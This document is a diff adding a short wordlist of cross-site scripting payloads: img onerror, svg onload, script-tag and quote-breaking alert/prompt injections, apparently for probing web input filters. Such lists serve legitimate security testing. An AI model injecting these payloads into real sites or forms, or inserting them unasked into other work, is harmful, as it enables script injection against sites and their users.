@@ -1,0 +1,30 @@
+"><img src=x onerror=alert(1)>
+"><img src=x onerror=alert(2)>
+"><img src=x onerror=alert(3)>
+"><img src=x onerror=alert(4)>
+"><img src=x onerror=alert(5)>
+<svg onload=prompt(1)>
+<svg onload=prompt(2)>
+<svg onload=prompt(3)>
+<svg onload=prompt(4)>
+<svg onload=prompt(5)>
+'alert(1);//
+'alert(2);//
+'alert(3);//
+'alert(4);//
+'alert(5);//
+<img src=x onerror=alert(1)>
+<img src=x onerror=alert(2)>
+<img src=x onerror=alert(3)>
+<img src=x onerror=alert(4)>
+<img src=x onerror=alert(5)>
+<script>alert(1)</script>
+<script>alert(2)</script>
+<script>alert(3)</script>
+<script>alert(4)</script>
+<script>alert(5)</script>
+'prompt(1);//
+'prompt(2);//
+'prompt(3);//
+'prompt(4);//
+'prompt(5);//
